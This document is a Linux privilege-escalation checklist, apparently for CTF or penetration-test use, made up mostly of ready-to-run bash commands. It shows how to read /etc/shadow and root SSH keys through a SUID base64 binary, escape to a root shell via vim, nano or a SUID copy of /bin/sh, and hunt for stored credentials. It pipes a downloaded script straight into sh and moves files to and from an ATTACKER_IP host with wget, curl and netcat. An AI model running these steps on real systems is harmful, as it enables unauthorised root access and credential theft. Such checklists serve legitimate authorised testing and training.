# Linux Privilege Escalation Checklist

## Initial Enumeration

```bash
# System information
uname -a
cat /etc/os-release
cat /proc/version
lscpu

# User information
id
whoami
sudo -l
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/shadow # If readable
cat /etc/group
history
env

# Network information
ifconfig -a || ip a
route || ip route
netstat -antup || ss -tunlp
iptables -L
cat /etc/hosts
cat /etc/resolv.conf

# Running processes
ps aux
ps -ef
pstree

# Installed packages and services
dpkg -l # Debian-based
rpm -qa # Red Hat-based
service --status-all
systemctl list-unit-files
ls -la /etc/init.d/

# Find world-writable directories and files
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null

# Find world-executable files
find / -perm -o+x -type f 2>/dev/null
```

## SUID/SGID Binaries

```bash
# Find SUID files
find / -perm -u=s -type f 2>/dev/null

# Find SGID files
find / -perm -g=s -type f 2>/dev/null

# Both in one command
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

## Exploiting Common SUID Binaries

### Using base64 with SUID to read protected files

If base64 has the SUID bit set, it can be exploited to read files that require elevated privileges:

```bash
# Check if base64 has SUID bit
ls -la /usr/bin/base64

# If it does, use it to read sensitive files
/usr/bin/base64 /etc/shadow | base64 --decode
/usr/bin/base64 /root/.ssh/id_rsa | base64 --decode
/usr/bin/base64 /var/log/auth.log | base64 --decode

# Use it to read flag files or other sensitive data
/usr/bin/base64 /root/root.txt | base64 --decode
/usr/bin/base64 /home/user/flag.txt | base64 --decode

# Read password hashes to crack offline
/usr/bin/base64 /etc/shadow | base64 --decode | grep root
/usr/bin/base64 /etc/shadow | base64 --decode | grep admin
```

### Other common SUID exploitation techniques

```bash
# If find has SUID bit
find / -name example -exec whoami \;

# If vim/nano has SUID bit
vim -c ':!/bin/sh'
nano -s /bin/sh
nano
^R^X
reset; sh 1>&0 2>&0

# If cp has SUID bit
cp /bin/sh /tmp/sh
chmod +s /tmp/sh
/tmp/sh -p
```

## Sudo Rights

```bash
# List sudo rights
sudo -l

# Check if you can run anything with sudo
sudo -l 2>/dev/null | grep -v "not allowed" | grep -v "no sudo"
```

## Capabilities

```bash
# List all files with capabilities
getcap -r / 2>/dev/null

# Check specific directories for capabilities
getcap -r /usr/bin/ 2>/dev/null
getcap -r /usr/sbin/ 2>/dev/null
getcap -r /bin/ 2>/dev/null
getcap -r /sbin/ 2>/dev/null
```

## Cron Jobs

```bash
# View crontabs
cat /etc/crontab
ls -la /etc/cron*

# Look for unusual cron jobs
find /etc/cron* -type f -exec ls -la {} \; 2>/dev/null
find /var/spool/cron -type f -exec ls -la {} \; 2>/dev/null
```

## PATH Manipulation

```bash
# Check PATH
echo $PATH

# Find world-writable directories in PATH
for d in `echo $PATH | tr ":" "\n"`; do
    find $d -writable -type d 2>/dev/null
done

# Find writable files in PATH
for d in `echo $PATH | tr ":" "\n"`; do
    find $d -writable -type f 2>/dev/null
done
```

## NFS Shares

```bash
# Check NFS exports
cat /etc/exports

# Check if 'no_root_squash' option is present
cat /etc/exports | grep no_root_squash
```

## Kernel Exploits

```bash
# Kernel version
uname -a
cat /proc/version

# Distribution details
cat /etc/issue
cat /etc/os-release
```

## Passwords and Sensitive Files

```bash
# Config files with passwords
grep -r "password" /etc/ 2>/dev/null
find /etc -name "*.conf" -o -name "*.config" -exec grep -l "password" {} \; 2>/dev/null

# Check common files for credentials
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.ssh/id_rsa
cat ~/.ssh/id_rsa.pub
```

## Finding Files

```bash
# Find all .txt files (useful for finding flags)
find / -name "*.txt" 2>/dev/null

# Find specific flag files
find / -name "*flag*" 2>/dev/null
find / -name "*.txt" 2>/dev/null | grep -i flag

# Find files with specific content
grep -r "password" /home 2>/dev/null
grep -r "flag" /home 2>/dev/null

# Find recently modified files
find / -type f -mtime -1 2>/dev/null
```

## Automated Tools (If Available)

```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Download and run LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Download and run Linux Smart Enumeration
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh -l1

# Download and run Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

## Step-by-Step Methodology

1. Collect system information (OS, kernel, hardware)
2. Check current user privileges and groups
3. Look for SUID/SGID binaries
4. Check sudo privileges (`sudo -l`)
5. Check for capabilities
6. Examine cron jobs
7. Inspect PATH for opportunities
8. Look for NFS shares with no_root_squash
9. Check for sensitive files with passwords
10. Hunt for world-writable files and directories
11. Look for unusual services or processes
12. If possible, run automated enumeration tools
13. Consider kernel exploits as a last resort

## Common Exploits by Binary

### SUID Binaries to Look For
```
base64      # Read sensitive files
cp          # Copy malicious binaries
find        # Execute commands
bash/dash   # Get shell with elevated privileges
nmap        # Interactive mode or script execution
vim/nano    # Edit files or get shell
less/more   # Read files or get shell
```

### Sudo Commands to Look For
```
vi/vim
less
more
man
awk
perl
python
ruby
nmap
tcpdump
bash
sh
find
```

## File Transfer Methods

```bash
# Python HTTP server
python -m SimpleHTTPServer 8000   # Python 2
python3 -m http.server 8000       # Python 3

# Download with wget
wget http://ATTACKER_IP:8000/filename

# Download with curl
curl http://ATTACKER_IP:8000/filename -o filename

# Netcat file transfer (receiver)
nc -lvp 1234 > filename

# Netcat file transfer (sender)
cat filename | nc RECEIVER_IP 1234
``` 